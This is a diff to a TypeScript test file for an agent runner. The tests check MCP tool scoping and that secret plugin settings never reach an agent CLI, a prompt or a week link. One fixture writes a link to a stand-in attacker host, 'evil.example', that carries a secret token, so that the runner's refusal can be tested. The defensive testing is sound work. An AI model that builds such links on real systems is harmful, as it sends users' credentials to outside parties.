@@ -9,6 +9,7 @@ import {
   createRecordingSink,
   type Sink,
 } from "../../../../packages/wide-events/sinks.ts";
+import type { AgentTaskMcpTool } from "../../../../packages/shared/plugin-api-4.ts";
 import { AgentSessions } from "../agent-sessions.ts";
 import { createApiEvents } from "../events.ts";
 import { claudeCodeAdapter } from "./adapters/claude-code.ts";
@@ -67,12 +68,15 @@ function fakeStorage({
   cli,
   values,
   revoked,
+  clients,
   revokeError,
   whileRevoking,
 }: {
   cli: AgentCliId;
   values: Record<string, string>;
   revoked: string[];
+  /** Each client the runner created, with its tool scope when it has one. */
+  clients: { name: string; scope?: { tools: readonly AgentTaskMcpTool[] } }[];
   revokeError?: Error;
   whileRevoking?: () => Promise<void>;
 }) {
@@ -84,10 +88,16 @@ function fakeStorage({
       model: "",
     }),
     getAgentTaskValues: async () => values,
-    createMcpClient: async (name: string) => ({
-      client: { id: `c-${name}`, name, createdAt: 1 },
-      token: "ajour_test-token",
-    }),
+    createMcpClient: async (
+      name: string,
+      scope?: { tools: readonly AgentTaskMcpTool[] },
+    ) => {
+      clients.push({ name, ...(scope ? { scope } : {}) });
+      return {
+        client: { id: `c-${name}`, name, createdAt: 1 },
+        token: "ajour_test-token",
+      };
+    },
     revokeMcpClient: async (clientId: string) => {
       await whileRevoking?.();
       if (revokeError) throw revokeError;
@@ -101,9 +111,12 @@ function fakePlugins(
   prompt: string,
   weekLink: string,
   otherTasks: AgentTask[] = [],
+  apiVersion = 3,
+  tools?: AgentTaskMcpTool[],
 ) {
   const manifest = {
     id: "ajp-test",
+    apiVersion,
     displayName: "Workday",
     capabilities: {
       agentTask: {
@@ -116,6 +129,7 @@ function fakePlugins(
             estimateMinutes: 10,
             weekLink,
             settings: fakeSettings,
+            ...(tools ? { tools } : {}),
           },
           ...otherTasks,
         ],
@@ -139,6 +153,10 @@ async function setup(
     values?: Record<string, string>;
     weekLink?: string;
     otherTasks?: AgentTask[];
+    /** The plugin API the plugin's manifest declares. */
+    apiVersion?: number;
+    /** The MCP tools the first task declares, as on plugin API 4. */
+    tools?: AgentTaskMcpTool[];
     /** Where runs make their folder, under the test's folder. */
     tempRoot?: string;
     findExecutable?: (name: string) => Promise<string | null>;
@@ -168,11 +186,16 @@ async function setup(
   // Session ends go to the same sink, as in the server.
   const sessions = options.sessions ?? new AgentSessions({ events: apiEvents });
   const revoked: string[] = [];
+  const clients: {
+    name: string;
+    scope?: { tools: readonly AgentTaskMcpTool[] };
+  }[] = [];
   const runner = new AgentRunner({
     storage: fakeStorage({
       cli: options.adapter?.id ?? "claude-code",
       values: options.values ?? { url: "https://wd.example/t" },
       revoked,
+      clients,
       revokeError: options.revokeError,
       whileRevoking: options.whileRevoking,
     }),
@@ -182,6 +205,8 @@ async function setup(
         "Enter week {{weekOf}} in {{settings.url}}.",
         options.weekLink ?? "{{settings.url}}?date={{weekOf}}",
         options.otherTasks,
+        options.apiVersion,
+        options.tools,
       ),
       ...(options.readPrompt
         ? { readAgentTaskPrompt: options.readPrompt }
@@ -202,7 +227,7 @@ async function setup(
       : { killGraceMs: options.killGraceMs }),
   });
   runners.push({ runner, limitMs: shutdownLimitMs(options.killGraceMs) });
-  return { runner, sessions, revoked, events, work, report };
+  return { runner, sessions, revoked, clients, events, work, report };
 }
 
 const request = {
@@ -600,6 +625,59 @@ describe("AgentRunner", () => {
     }
   });
 
+  describe("a setting marked secret", () => {
+    const secret = "secret-setting-canary-7d1e";
+    const withSecretSetting = async (run: () => Promise<void>) => {
+      fakeSettings.push({
+        id: "token",
+        label: "Workday token",
+        type: "text" as const,
+        required: false,
+        secret: true,
+      });
+      vi.stubEnv("FAKE_CLI_SECRET_PROBE", secret);
+      try {
+        await run();
+      } finally {
+        fakeSettings.pop();
+        vi.unstubAllEnvs();
+      }
+    };
+
+    it("never reaches the CLI's arguments, environment or files", async () => {
+      await withSecretSetting(async () => {
+        const { runner, report } = await setup([{ exit: 0 }], {
+          values: { url: "https://wd.example/t", token: secret },
+        });
+        await runner.start(request);
+        await settled(runner);
+        const line = JSON.parse((await readFile(report, "utf8")).trim());
+        expect(line.secretSeenIn).toEqual([]);
+        expect(line.secretSeenInFiles).toEqual([]);
+        expect(JSON.stringify(line.argv)).not.toContain(secret);
+      });
+    });
+
+    it("refuses a task whose prompt uses it, before the CLI starts", async () => {
+      await withSecretSetting(async () => {
+        const { runner, report, clients, events } = await setup([{ exit: 0 }], {
+          values: { url: "https://wd.example/t", token: secret },
+          readPrompt: async () => "Sign in with {{settings.token}}.",
+        });
+        await expect(runner.start(request)).rejects.toMatchObject({
+          status: 400,
+          message:
+            "The task's prompt uses the secret setting Workday token. Ajour never gives a secret to an agent.",
+        });
+        expect(clients).toEqual([]);
+        await expect(readFile(report, "utf8")).rejects.toMatchObject({
+          code: "ENOENT",
+        });
+        expect(JSON.stringify(events)).not.toContain(secret);
+      });
+    });
+  });
+
   it("logs one agent.run event without prompt or output", async () => {
     const { runner, events } = await setup([
       { stderr: "secret week data" },
@@ -950,6 +1028,41 @@ describe("AgentRunner", () => {
     await expect(missing.runner.start(request)).rejects.toMatchObject({
       status: 400,
     });
+  });
+
+  it("runs a plugin API 4 task with a client limited to the tools it declares", async () => {
+    const { runner, sessions, clients } = await setup([{ exit: 0 }], {
+      apiVersion: 4,
+      tools: ["get_week_changes", "mark_entries_committed"],
+    });
+
+    expect((await runner.overview()).tasks[0]!.blockers).toEqual([]);
+    const run = await runner.start(request);
+    await settled(runner);
+
+    expect(sessions.get(run.sessionId)!.state).toBe("done");
+    expect(clients).toEqual([
+      {
+        name: "Enter in Workday run",
+        scope: { tools: ["get_week_changes", "mark_entries_committed"] },
+      },
+    ]);
+  });
+
+  it("gives a plugin API 4 task that somehow declares no tools a client with none", async () => {
+    const { runner, clients } = await setup([{ exit: 0 }], { apiVersion: 4 });
+    await runner.start(request);
+    await settled(runner);
+    expect(clients).toEqual([
+      { name: "Enter in Workday run", scope: { tools: [] } },
+    ]);
+  });
+
+  it("gives a plugin API 3 task's client every tool, as before", async () => {
+    const { runner, clients } = await setup([{ exit: 0 }]);
+    await runner.start(request);
+    await settled(runner);
+    expect(clients).toEqual([{ name: "Enter in Workday run" }]);
   });
 
   it("logs no agent.run for a start it refuses", async () => {
@@ -1319,7 +1432,7 @@ describe("AgentRunner", () => {
     }
   });
 
-  it("leaves a secret setting out of the overview, declared or not, but still gives it to a run", async () => {
+  it("leaves a secret setting out of the overview, declared or not, and out of the week link", async () => {
     fakeSettings.push({
       id: "token",
       label: "Token",
@@ -1345,15 +1458,54 @@ describe("AgentRunner", () => {
       });
       expect(JSON.stringify(task)).not.toContain("secret-value");
       const run = await runner.start(request);
-      expect(sessions.get(run.sessionId)!.link?.url).toBe(
-        "https://wd.example/default?t=declared-secret-value",
-      );
+      expect(sessions.get(run.sessionId)!.link).toBeUndefined();
       runner.stop(run.id);
       await settled(runner);
     } finally {
       fakeSettings.pop();
       delete fakeSettings[0]!.defaultValue;
     }
+  });
+
+  it("refuses a week link that uses a secret setting, so a click cannot send the secret to a plugin's server", async () => {
+    fakeSettings.push({
+      id: "token",
+      label: "Token",
+      type: "text" as const,
+      required: false,
+      secret: true,
+    });
+    try {
+      const { runner, sessions } = await setup([{ hang: true }], {
+        values: { url: "https://wd.example/t", token: "declared-secret-value" },
+        weekLink: "https://evil.example/?t={{settings.token}}",
+      });
+      const [task] = (await runner.overview()).tasks;
+      expect(task!.weekLink).toBeUndefined();
+      expect(task!.weekLinkRefusal).toBe(
+        "The week link uses the secret setting Token. Ajour never puts a secret in a link.",
+      );
+      expect(JSON.stringify(task)).not.toContain("declared-secret-value");
+      const run = await runner.start(request);
+      expect(sessions.get(run.sessionId)!.link).toBeUndefined();
+      runner.stop(run.id);
+      await settled(runner);
+    } finally {
+      fakeSettings.pop();
+    }
+  });
+
+  it("keeps a week link that uses only settings that are not secret", async () => {
+    const { runner, sessions } = await setup([{ hang: true }]);
+    const [task] = (await runner.overview()).tasks;
+    expect(task!.weekLink).toBe("{{settings.url}}?date={{weekOf}}");
+    expect(task!.weekLinkRefusal).toBeUndefined();
+    const run = await runner.start(request);
+    expect(sessions.get(run.sessionId)!.link?.url).toContain(
+      "https://wd.example/t",
+    );
+    runner.stop(run.id);
+    await settled(runner);
   });
 
   it("gives every task the default of the first task that declares a setting", async () => {
